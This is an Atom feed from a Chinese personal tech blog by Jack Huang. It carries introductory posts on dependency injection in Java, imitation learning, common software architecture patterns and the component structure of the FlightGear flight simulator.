<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jack Huang&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://huangwang.github.io/"/>
  <updated>2019-01-26T12:44:50.264Z</updated>
  <id>https://huangwang.github.io/</id>
  
  <author>
    <name>Jack Huang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>依赖注入入门</title>
    <link href="https://huangwang.github.io/2019/01/26/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
    <id>https://huangwang.github.io/2019/01/26/依赖注入入门/</id>
    <published>2019-01-26T12:34:08.000Z</published>
    <updated>2019-01-26T12:44:50.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="依赖注入定义"><a href="#依赖注入定义" class="headerlink" title="依赖注入定义"></a>依赖注入定义</h1><p>在软件工程中，依赖注入是种实现控制反转用于解决依赖性设计模式。一个依赖关系指的是可被利用的一种对象（即服务提供端） 。依赖注入是将所依赖的传递给将使用的从属对象（即客户端）。该服务是将会变成客户端的状态的一部分。 传递服务给客户端，而非允许客户端来建立或寻找服务，是本设计模式的基本要求。</p><h1 id="依赖注入意义"><a href="#依赖注入意义" class="headerlink" title="依赖注入意义"></a>依赖注入意义</h1><h2 id="依赖存在的问题"><a href="#依赖存在的问题" class="headerlink" title="依赖存在的问题"></a>依赖存在的问题</h2><p>如果在 Class A 中，有 Class B 的实例，则称 Class A 对 Class B 有一个依赖。例如下面类 Human 中用到一个 Father 对象，我们就说类 Human 对类 Father 有一个依赖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human() &#123;</span><br><span class="line">        father = new Father();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看这段代码我们会发现存在一些问题：</p><ul><li>如果现在要改变 father 生成方式，如需要用new Father(String name)初始化 father，需要修改 Human 代码；</li><li>如果想测试不同 Father 对象对 Human 的影响很困难，因为 father 的初始化被写死在了 Human 的构造函数中；</li><li>如果new Father()过程非常缓慢，单测时我们希望用已经初始化好的 father 对象 Mock 掉这个过程也很困难。</li></ul><h2 id="依赖注入的好处"><a href="#依赖注入的好处" class="headerlink" title="依赖注入的好处"></a>依赖注入的好处</h2><p>上面将依赖在构造函数中直接初始化是一种 Hard init 方式，弊端在于两个类不够独立，不方便测试。我们还有另外一种 Init 方式，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human(Father father) &#123;</span><br><span class="line">        this.father = father;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面代码中，我们将 father 对象作为构造函数的一个参数传入。在调用 Human 的构造方法之前外部就已经初始化好了 Father 对象。像这种非自己主动初始化依赖，而通过外部来传入依赖的方式，我们就称为依赖注入。</p><p>现在我们发现上面 1 中存在的两个问题都很好解决了，简单的说依赖注入主要有两个好处：</p><ul><li>解耦，将依赖之间解耦。</li><li>因为已经解耦，所以方便做单元测试，尤其是 Mock 测试。</li></ul><h1 id="依赖注入实现"><a href="#依赖注入实现" class="headerlink" title="依赖注入实现"></a>依赖注入实现</h1><h2 id="Java-中的依赖注入"><a href="#Java-中的依赖注入" class="headerlink" title="Java 中的依赖注入"></a>Java 中的依赖注入</h2><p>依赖注入的实现有多种途径，而在 Java 中，使用注解是最常用的。通过在字段的声明前添加 @Inject 注解进行标记，来实现依赖对象的自动注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Human &#123;</span><br><span class="line">    ...</span><br><span class="line">    @Inject Father father;</span><br><span class="line">    ...</span><br><span class="line">    public Human() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码看起来很神奇：只是增加了一个注解，Father 对象就能自动注入了？这个注入过程是怎么完成的？</p><p>实质上，如果你只是写了一个 @Inject 注解，Father 并不会被自动注入。你还需要使用一个依赖注入框架，并进行简单的配置。现在 Java 语言中较流行的依赖注入框架有 Google Guice、Spring 等，而在 Android 上比较流行的有 RoboGuice、Dagger 等。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/依赖注入" target="_blank" rel="noopener">依赖注入</a>,by wikipedia.</li><li><a href="https://github.com/android-cn/blog/tree/master/java/dependency-injection" target="_blank" rel="noopener">依赖注入</a>,by android-cn.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;依赖注入定义&quot;&gt;&lt;a href=&quot;#依赖注入定义&quot; class=&quot;headerlink&quot; title=&quot;依赖注入定义&quot;&gt;&lt;/a&gt;依赖注入定义&lt;/h1&gt;&lt;p&gt;在软件工程中，依赖注入是种实现控制反转用于解决依赖性设计模式。一个依赖关系指的是可被利用的一种对象（即服务提
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="软件工程" scheme="https://huangwang.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>模仿学习入门</title>
    <link href="https://huangwang.github.io/2019/01/26/%E6%A8%A1%E4%BB%BF%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"/>
    <id>https://huangwang.github.io/2019/01/26/模仿学习入门/</id>
    <published>2019-01-26T03:31:05.000Z</published>
    <updated>2019-01-26T12:02:05.783Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模仿学习定义"><a href="#模仿学习定义" class="headerlink" title="模仿学习定义"></a>模仿学习定义</h1><p>模仿学习是指从示教者提供的范例中学习，一般提供人类专家的决策数据</p><script type="math/tex; mode=display">\{ \tau_1,\tau_2,\ldots,\tau_m \}</script><p>，每个决策包含状态和动作序列  </p><script type="math/tex; mode=display">\tau_i = <s_1^i,a_1^i,s_2^i,a_2^i,\ldots,s_{n_ni+1}^i></script><p>，将所有「状态-动作对」抽取出来构造新的集合 </p><script type="math/tex; mode=display">\mathcal{D}=\{ (s_1,a_1),(s_2,a_2),(s_3,a_3),\ldots \}</script><p>。之后就可以把状态作为特征（feature），动作作为标记（label）进行分类（对于离散动作）或回归（对于连续动作）的学习从而得到最优策略模型。模型的训练目标是使模型生成的状态-动作轨迹分布和输入的轨迹分布相匹配。</p><h1 id="模仿学习意义"><a href="#模仿学习意义" class="headerlink" title="模仿学习意义"></a>模仿学习意义</h1><p>在传统的强化学习任务中，通常通过计算累积奖赏来学习最优策略（policy），这种方式简单直接，而且在可以获得较多训练数据的情况下有较好的表现。然而在多步决策（sequential decision）中，学习器不能频繁地得到奖励，且这种基于累积奖赏及学习方式存在非常巨大的搜索空间。而模仿学习（Imitation Learning）的方法经过多年的发展，已经能够很好地解决多步决策问题，在机器人、 NLP 等领域也有很多的应用。</p><h1 id="模仿学习实现"><a href="#模仿学习实现" class="headerlink" title="模仿学习实现"></a>模仿学习实现</h1><p>当前主要以下几种方法实现模型学习：</p><h2 id="行为克隆（Behavior-Cloning）"><a href="#行为克隆（Behavior-Cloning）" class="headerlink" title="行为克隆（Behavior Cloning）"></a>行为克隆（Behavior Cloning）</h2><p>行为克隆（Behavior Cloning）根据人类提供的状态动作对来习得策略，是作为监督学习的模仿学习。</p><h2 id="逆强化学习（Inverse-Reinforcement-Learning-）"><a href="#逆强化学习（Inverse-Reinforcement-Learning-）" class="headerlink" title="逆强化学习（Inverse Reinforcement Learning ）"></a>逆强化学习（Inverse Reinforcement Learning ）</h2><p>IRL 是 反过来的 RL，RL 是根据 reward 进行参数的调整，然后得到一个 policy。</p><p>但是， IRL 就不同了，因为他没有显示的 reward，只能根据 人类行为，进行 reward的估计（反推 reward 的函数）。在得到 reward 函数估计出来之后，再进行 策略函数的估计。</p><p>逆强化学习是在给定一个专家之后（expert policy），通过不断地寻找 reward function 来满足给定的 statement（即，解释专家的行为，explaining expert behavior）。</p><h2 id="结构化预测（Structured-prediction）"><a href="#结构化预测（Structured-prediction）" class="headerlink" title="结构化预测（Structured prediction）"></a>结构化预测（Structured prediction）</h2><p>在机器学习过程中，对数据的拟合其实就是在找一个拟合函数f，比如对于回归问题（Regression）来说，这个函数输出一个标量（scalar），对于分类问题（Classification）来说，这个函数输出一个类别（一个one-hot的向量），但是有一类的预测，它并不是输出一个标量或者一个类别，而是输出些有结构的输出，比如，一个序列，一个句子，一个图，一颗树。</p><h2 id="生成对抗网络（GAN-for-Imitation-Learning）"><a href="#生成对抗网络（GAN-for-Imitation-Learning）" class="headerlink" title="生成对抗网络（GAN for Imitation Learning）"></a>生成对抗网络（GAN for Imitation Learning）</h2><p>那么如何用 GAN 来做这个事情呢？对应到这件事情上，我们知道，我们想得到的 轨迹 是属于某一个高维的空间中，而 expert 给定的那些轨迹，我们假设是属于一个 distribution，我们想让我们的 model，也去 predict 一个分布出来，然后使得这两者之间尽可能的接近。从而完成 actor 的训练过程。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/25688750" target="_blank" rel="noopener">模仿学习（Imitation Learning）完全介绍（一）</a>,by 我勒个矗.</li><li><a href="https://yq.aliyun.com/articles/310760" target="_blank" rel="noopener">深度强化学习之：模仿学习（imitation learning）</a>,by wangxiaocvpr.</li><li><a href="https://blog.csdn.net/c2a2o2/article/details/77336551" target="_blank" rel="noopener">机器人学习Robot Learning之模仿学习Imitation Learning的发展</a>,by c2a2o2.</li><li><a href="https://hewangxing.gitee.io/行为克隆/" target="_blank" rel="noopener">行为克隆</a>,by XINGYES.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;模仿学习定义&quot;&gt;&lt;a href=&quot;#模仿学习定义&quot; class=&quot;headerlink&quot; title=&quot;模仿学习定义&quot;&gt;&lt;/a&gt;模仿学习定义&lt;/h1&gt;&lt;p&gt;模仿学习是指从示教者提供的范例中学习，一般提供人类专家的决策数据&lt;/p&gt;
&lt;script type=&quot;mat
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="机器学习" scheme="https://huangwang.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>软件架构的一些思考</title>
    <link href="https://huangwang.github.io/2019/01/25/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>https://huangwang.github.io/2019/01/25/软件架构的一些思考/</id>
    <published>2019-01-25T02:55:27.000Z</published>
    <updated>2019-01-26T02:06:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>以前对软件架构总是雾里看花，似懂非懂，最近好像有点悟了，赶紧记录一下。</p><h1 id="软件架构的定义（What）"><a href="#软件架构的定义（What）" class="headerlink" title="软件架构的定义（What）"></a>软件架构的定义（What）</h1><p><strong>软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计</strong><sup>[1]</sup>。</p><p>软件体系结构是构建计算机软件实践的基础。与建筑师设定建筑项目的设计原则和目标，作为绘图员画图的基础一样，软件架构师或者系统架构师陈述软件架构以作为满足不同客户需求的实际系统设计方案的基础。从和目的、主题、材料和结构的联系上来说，软件架构可以和建筑物的架构相比拟。一个软件架构师需要有广泛的软件理论知识和相应的经验来实施和管理软件产品的高级设计。软件架构师定义和设计软件的模块化，模块之间的交互，用户界面风格，对外接口方法，创新的设计特性，以及高层事物的对象操作、逻辑和流程。</p><h1 id="软件架构的意义（Why）"><a href="#软件架构的意义（Why）" class="headerlink" title="软件架构的意义（Why）"></a>软件架构的意义（Why）</h1><p>软件架构是一个系统的草图。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。</p><p>软件架构是软件架构师与项目干系人沟通的工具。例如：软件架构师与客户商谈概念上的事情，与经理商谈广泛的设计问题，与软件工程师商谈创新的结构特性，与程序员商谈实现技巧，外观和风格。</p><h1 id="软件架构的选择（How）"><a href="#软件架构的选择（How）" class="headerlink" title="软件架构的选择（How）"></a>软件架构的选择（How）</h1><p><strong>用户需求决定软件架构的选择</strong>。用户需求可分成功能性需求和非功能性需求。功能性需求即用户要求软件产品应实现什么样的功能，非功能性需求即用户要求软件产品的质量属性达到一定标准。以开发一个购物网站为例，用户要求实现商品展示功能、购物车功能即功能性需求，用户要求在1秒内打开购物网站、网站平均无故障时间是一个月即非功能性需求。<strong>通常用户的非功能性需求对软件架构产生决定性影响</strong>。</p><h2 id="常见的软件架构"><a href="#常见的软件架构" class="headerlink" title="常见的软件架构"></a>常见的软件架构</h2><h3 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h3><p>分层架构（layered architecture）是最常见的软件架构，也是事实上的标准架构。如果你不知道要用什么架构，那就用它。</p><p>这种架构将软件分成若干个水平层，每一层都有清晰的角色和分工，不需要知道其他层的细节。层与层之间通过接口通信。</p><p>虽然没有明确约定，软件一定要分成多少层，但是四层的结构最常见:</p><ul><li>表现层（presentation）：用户界面，负责视觉和用户互动</li><li>业务层（business）：实现业务逻辑</li><li>持久层（persistence）：提供数据，SQL 语句就放在这一层</li><li>数据库（database） ：保存数据</li></ul><h3 id="事件驱动架构"><a href="#事件驱动架构" class="headerlink" title="事件驱动架构"></a>事件驱动架构</h3><p>事件（event）是状态发生变化时，软件发出的通知。</p><p>事件驱动架构（event-driven architecture）就是通过事件进行通信的软件架构。它分成四个部分。</p><ul><li>事件队列（event queue）：接收事件的入口</li><li>分发器（event mediator）：将不同的事件分发到不同的业务逻辑单元</li><li>事件通道（event channel）：分发器与处理器之间的联系渠道</li><li>事件处理器（event processor）：实现业务逻辑，处理完成后会发出事件，触发下一步操作</li></ul><h3 id="微核架构"><a href="#微核架构" class="headerlink" title="微核架构"></a>微核架构</h3><p>微核架构（microkernel architecture）又称为”插件架构”（plug-in architecture），指的是软件的内核相对较小，主要功能和业务逻辑都通过插件实现。</p><p>内核（core）通常只包含系统运行的最小功能。插件则是互相独立的，插件之间的通信，应该减少到最低，避免出现互相依赖的问题。</p><h3 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h3><p>微服务架构（microservices architecture）是服务导向架构（service-oriented architecture，缩写 SOA）的升级。</p><p>每一个服务就是一个独立的部署单元（separately deployed unit）。这些单元都是分布式的，互相解耦，通过远程通信协议（比如REST、SOAP）联系。</p><p>微服务架构分成三种实现模式。</p><ul><li>RESTful API 模式：服务通过 API 提供，云服务就属于这一类</li><li>RESTful 应用模式：服务通过传统的网络协议或者应用协议提供，背后通常是一个多功能的应用程序，常见于企业内部</li><li>集中消息模式：采用消息代理（message broker），可以实现消息队列、负载均衡、统一日志和异常处理，缺点是会出现单点失败，消息代理可能要做成集群</li></ul><h3 id="云架构"><a href="#云架构" class="headerlink" title="云架构"></a>云架构</h3><p>云结构（cloud architecture）主要解决扩展性和并发的问题，是最容易扩展的架构。</p><p>它的高扩展性，主要原因是没使用中央数据库，而是把数据都复制到内存中，变成可复制的内存数据单元。然后，业务处理能力封装成一个个处理单元（prcessing unit）。访问量增加，就新建处理单元；访问量减少，就关闭处理单元。由于没有中央数据库，所以扩展性的最大瓶颈消失了。由于每个处理单元的数据都在内存里，最好要进行数据持久化。</p><p>这个模式主要分成两部分：处理单元（processing unit）和虚拟中间件（virtualized middleware）。</p><ul><li>处理单元：实现业务逻辑</li><li>虚拟中间件：负责通信、保持sessions、数据复制、分布式处理、处理单元的部署。</li></ul><p>虚拟中间件又包含四个组件。</p><ul><li>消息中间件（Messaging Grid）：管理用户请求和session，当一个请求进来以后，决定分配给哪一个处理单元。</li><li>数据中间件（Data Grid）：将数据复制到每一个处理单元，即数据同步。保证某个处理单元都得到同样的数据。</li><li>处理中间件（Processing Grid）：可选，如果一个请求涉及不同类型的处理单元，该中间件负责协调处理单元</li><li>部署中间件（Deployment Manager）：负责处理单元的启动和关闭，监控负载和响应时间，当负载增加，就新启动处理单元，负载减少，就关闭处理单元。</li></ul><h3 id="客户端-服务器架构"><a href="#客户端-服务器架构" class="headerlink" title="客户端/服务器架构"></a>客户端/服务器架构</h3><p>这种架构由两部分组成：一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务，服务器为这些客户端提供相关服务。此外，服务器持续侦听客户机请求。</p><h3 id="模型-视图-控制器架构"><a href="#模型-视图-控制器架构" class="headerlink" title="模型/视图/控制器架构"></a>模型/视图/控制器架构</h3><p>这种架构，也称为MVC模式，把一个交互式应用程序划分为3个部分，</p><ul><li>模型：包含核心功能和数据</li><li>视图：将信息显示给用户(可以定义多个视图)</li><li>控制器：处理用户输入的信息</li></ul><p>这样做是为了将信息的内部表示与信息的呈现方式分离开来，并接受用户的请求。它分离了组件，并允许有效的代码重用。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><a href="https://zh.wikipedia.org/wiki/软件架构" target="_blank" rel="noopener">软件架构</a>,by wikipedia.</li><li><a href="http://www.ruanyifeng.com/blog/2016/09/software-architecture.html" target="_blank" rel="noopener">软件架构入门</a>,by 阮一峰.</li><li><a href="https://www.cnblogs.com/IcanFixIt/p/7518146.html" target="_blank" rel="noopener">10种常见的软件架构模式</a>,by 尽信书不如无书.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以前对软件架构总是雾里看花，似懂非懂，最近好像有点悟了，赶紧记录一下。&lt;/p&gt;
&lt;h1 id=&quot;软件架构的定义（What）&quot;&gt;&lt;a href=&quot;#软件架构的定义（What）&quot; class=&quot;headerlink&quot; title=&quot;软件架构的定义（What）&quot;&gt;&lt;/a&gt;软件架构
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="软件工程" scheme="https://huangwang.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>FlightGear技术分析</title>
    <link href="https://huangwang.github.io/2019/01/24/FlightGear%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    <id>https://huangwang.github.io/2019/01/24/FlightGear技术分析/</id>
    <published>2019-01-24T09:32:59.000Z</published>
    <updated>2019-01-25T14:59:54.602Z</updated>
    
    <content type="html"><![CDATA[<p>FlightGear是一个始于1997年多平台飞行模拟器、开源软件项目<sup>[1]</sup>。该项目适用的操作系统主要包括Linux、Microsoft Windows和Mac OS X，采用C++编写。</p><h1 id="FlightGear体系结构"><a href="#FlightGear体系结构" class="headerlink" title="FlightGear体系结构"></a>FlightGear体系结构</h1><h2 id="当前体系结构"><a href="#当前体系结构" class="headerlink" title="当前体系结构"></a>当前体系结构</h2><p>FlightGear体系结构基于一个名为“主循环”的无限循环<sup>[2]</sup>。其流程图如图1所示。在主循环中将依次完成如下工作:</p><ul><li>ATC模拟</li><li>控制AI对象</li><li>在多用户环境中更新其他飞机</li><li>飞行动力学计算</li><li>风景更新</li><li>音频调度</li><li>渲染</li></ul><p></p><p align="center">    <img src="images/flightgear_mainloop.jpg" width="40%" alt="FlightGear主循环流程图"></p><p></p><center>图1  FlightGear主循环流程图</center><h2 id="高级体系结构"><a href="#高级体系结构" class="headerlink" title="高级体系结构"></a>高级体系结构</h2><p>FlightGear正在支持高级体系结构(High Level Architecture, HLA)<sup>[3][4]</sup>。</p><h3 id="HLA简介"><a href="#HLA简介" class="headerlink" title="HLA简介"></a>HLA简介</h3><p><strong>高级体系结构（HLA）是分布式仿真的标准，用于通过组合（联合）多个仿真来构建用于更大目的的仿真</strong>。该标准是在美国国防部的领导下于90年代开发的，后来转变为开放的国际IEEE标准。它是北约通过STANAG 4603推荐的标准。今天，HLA被用于许多领域，包括国防和安全以及民用应用。该体系结构指定以下组件：</p><ul><li>运行时基础结构（RTI），通过不同的编程语言提供标准化的服务集。这些服务包括信息交换，同步和联合管理</li><li>联邦成员（Federates）是使用RTI服务的单独仿真系统，由多个联邦成员对象构成。</li><li>联邦成员对象模型（FOM），指定用于交换数据的对象类和交互类。 FOM可以描述任何域的信息。</li></ul><p></p><p align="center">    <img src="images/HLA_Federation.png" width="90%" alt="HLA构成"></p><p></p><center>图2  HLA构成</center><p>HLA标准由三部分组成：</p><ul><li>IEEE Std 1516-2010框架和规则，它规定了组件或整个联合应遵守的十个体系结构规则。</li><li>IEEE Std 1516.1-2010联邦接口规范，规定了RTI应提供的服务。这些服务以C ++和Java API以及Web服务的形式提供。</li><li>IEEE Std 1516.2-2010对象模型模板规范，它规定了HLA对象模型（如FOM）应使用的格式。</li></ul><h3 id="HLA优势"><a href="#HLA优势" class="headerlink" title="HLA优势"></a>HLA优势</h3><p>与单机仿真相比，这有三大优势<sup>[5]</sup>（例如FlightGear V3.6）：</p><ul><li>它提供了一个强大的环境，使模拟器具有多线程，利用具有多个内核的计算机，或者在不同的计算机（甚至包括不同的平台和操作系统）上运行模拟的不同部分。</li><li>它允许我们分离模拟器的部分，如AI（通过解耦AI交通系统）、FDM、Nasal脚本和渲染器，以及较少时间关键的子系统，如天气，这样我们就可以获得一致（也许更高）的帧速率（即减少Nasal垃圾收集对帧速率的影响）。</li><li>它提供了一个非常好的框架，允许任何人使用除C / C ++之外的编程语言（想想Ada，Java，Python等）创建与FlightGear交互的组件，这些编程语言可能在他们自己的线程中运行，并且驻留在单独的二进制文件中，这也更容易调试/排除故障（想想回归测试，即在专用的gdb / valgrind会话中运行一个自包含的子系统），而不必知道如何修改/补丁和重建FlightGear。</li></ul><h1 id="FlightGear组件构成"><a href="#FlightGear组件构成" class="headerlink" title="FlightGear组件构成"></a>FlightGear组件构成</h1><p>FlightGear由很多开源组件或程序构成<sup>[6]</sup>，具体包括：</p><h2 id="RTI"><a href="#RTI" class="headerlink" title="RTI"></a>RTI</h2><p>RTI是HLA架构的关键组件，相当于中间件。</p><h3 id="OpenRTI"><a href="#OpenRTI" class="headerlink" title="OpenRTI"></a>OpenRTI</h3><p>OpenRTI是一个包含了rti 1.3、rti 1516、rti 1516e标准接口实现的rti库。OpenRTI有如下关键特性：</p><ul><li>易用性高，非常便于使用；</li><li>直接提供C++调用接口，也可以提供Java接口，但目前还没有编码实现；</li><li>可扩展性强；</li><li>一直在维护中的RTI开源项目；</li><li>树状的服务器结构；</li><li>最短路径在内存中不拷贝数据；</li><li>不依赖其它项目，仅仅需要C++编译器，特别的不需要boost；</li><li>支持线程间通信、rti通信和管道间通信，未来可能支持http通信；</li><li>到处都可以运行，能够在Linux、Win32、MacOS和Solaris上运行。</li></ul><h2 id="FDM"><a href="#FDM" class="headerlink" title="FDM"></a>FDM</h2><p>飞行动力学模型（Flight Dynamics Model, FDM）是模拟器内控制飞机物理飞行的数学模型。飞机的3D模型实质是一张图片，其与飞行动力学无关，本质上由FDM控制飞机如何飞行。在FlightGear中主要使用JSBSim和YASim两个飞行动力学模型。</p><h3 id="JSBSim"><a href="#JSBSim" class="headerlink" title="JSBSim"></a>JSBSim</h3><p>JSBSim是一个用C++实现的开源跨平台飞行器动力学模型软件。Flightgear也采用了JSBSim作为其中的飞行器动力模型之一。同时JSBSim也可以作为一个单独的动力学模型软件进行运行。</p><h3 id="YASim"><a href="#YASim" class="headerlink" title="YASim"></a>YASim</h3><p>YASim使用飞机的几何形状生成基本飞行特征。虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。</p><h2 id="Atlas"><a href="#Atlas" class="headerlink" title="Atlas"></a>Atlas</h2><p>Atlas旨在为FlightGear（一种开源飞行模拟器）的用户制作和展示世界高质量的图表。 这是通过两个主要部分实现的：地图创建者（简称为Map）和Atlas查看器。</p><ul><li><p>地图创建者从FlightGear获取风景数据并将其转换为漂亮的地图图片，可以使用您可能已安装的任何位图图像程序或使用Atlas查看应用程序查看。</p></li><li><p>Atlas查看应用程序可用于浏览您的地图，但也可以直接连接到FlightGear，并在所谓的移动地图显示上显示您的飞机当前位置。</p></li></ul><h2 id="FlightGear-Multiplayer-Server"><a href="#FlightGear-Multiplayer-Server" class="headerlink" title="FlightGear Multiplayer Server"></a>FlightGear Multiplayer Server</h2><p>FGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。它允许通过FGFS内的网络与其他飞行员一起飞行。</p><p>可以在服务器配置中配置的服务器列表类型：</p><ul><li>中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。</li><li>交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如 用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。</li><li>跟踪器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。</li><li>HUB  - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。</li></ul><h2 id="FGCOM"><a href="#FGCOM" class="headerlink" title="FGCOM"></a>FGCOM</h2><p>FGCom是一种语音通信功能。这样您就可以在飞行途中与其他飞行员和空域管制员进行通信。</p><p>主要思想是重现真实的航空通信，换句话说，此功能旨在使您的航班期间尽可能真实地进行无线电通信。</p><p>FGCom有两种方式：</p><p>集成到FlightGear（FGCom内置）：这当然是更好的解决方案，因为更容易使用<br>外部软件（FGCom standalone）：只有在计划在特殊情况下使用FGCom时才应使用此软件</p><h2 id="MPmap"><a href="#MPmap" class="headerlink" title="MPmap"></a>MPmap</h2><p>MPMap是一个实用程序，可以在世界地图上显示在FlightGear世界中飞行的飞机。 除此之外，它还提供对导航数据的访问，例如ILS频率，跑道号和修正。由于它使用谷歌地图，人们可以选择地图或卫星视图。</p><h2 id="SimGear"><a href="#SimGear" class="headerlink" title="SimGear"></a>SimGear</h2><p>SimGear是FlightGear使用的一组开源软件库。该项目仍在开发中，但其目标是成为“仿真内核”，并由其他非FlightGear项目使用。该项目于2000年启动。SimGear与FlightGear和TerraGear一样，需要PLIB进行构建。</p><p>SimGear是一个仿真架构工具集(simulation construction tools)，是FlightGear的仿真引擎，完成了数据结构操作、星历计算、模拟天空、坐标系转换等大部分的工作，它也是一个开源库。</p><h2 id="PLib"><a href="#PLib" class="headerlink" title="PLib"></a>PLib</h2><p>PLIB（便携式游戏库）是由Steve J. Baker编写的一套用于编写游戏的软件库。 FlightGear在其大部分开发中使用了PLIB。 它也被FlightGear相关程序Atlas使用。 PLIB是开源的，并且是在GNU Library General Public License下发布的。</p><p>FlightGear 1.0（2007年发布）是在向OpenSceneGraph（OSG）过渡之前使用PLIB进行3D场景图的最后一次公开发布。 FlightGear仍然使用PLIB执行各种任务; 例如，读取操纵杆输入并显示图形用户界面（GUI）。 在后一种用法中，PLIB的PUI组件最终将由Canvas和Phi在FlightGear中替换，这将极大地改善当前GUI的功能，超出PUI提供的功能。</p><p>构建FlightGear时需要PLIB。</p><h2 id="OSG"><a href="#OSG" class="headerlink" title="OSG"></a>OSG</h2><p>OSG是OpenSceneGraph的缩写，OpenSceneGraph图形系统是一个基于工业标准OpenGL的软件接口，它让程序员能够更加快速、便捷地创建高性能、跨平台的交互式图形程序。相比于工业标准OpenGL或者其他图形库，OpenSceneGraph的优点明显，除了程序开源和平台无关性以外，其封装并提供了数量众多的提升程序运行时性能的算法、针对包括分页数据库在内的几乎所有的主流数据格式的直接数据接口、 以及针对脚本语言系统Pthyon和Tcl的支持。 </p><p>OpenGL是Open Graphics Library的缩写，其独立于硬件，独立于窗口系统，在运行各种操作系统的各种计算机上都可用，并能在网络环境下以客户/服务器模式工作，是专业图形处理、科学计算等高端应用领域的标准图形库。</p><h2 id="场景相关工具"><a href="#场景相关工具" class="headerlink" title="场景相关工具"></a>场景相关工具</h2><h3 id="TerraSync"><a href="#TerraSync" class="headerlink" title="TerraSync"></a>TerraSync</h3><p>要查看飞机下方的地形，您必须安装相应的风景。这可以通过在安装风景的文章中描述的在飞行之前下载某些景点来实现。</p><p>或者，如果您有稳定且相当快速的互联网连接，则可以使用TerraSync。它是一个实用程序，可在模拟器运行时自动下载所需FlightGear场景的最新版本。 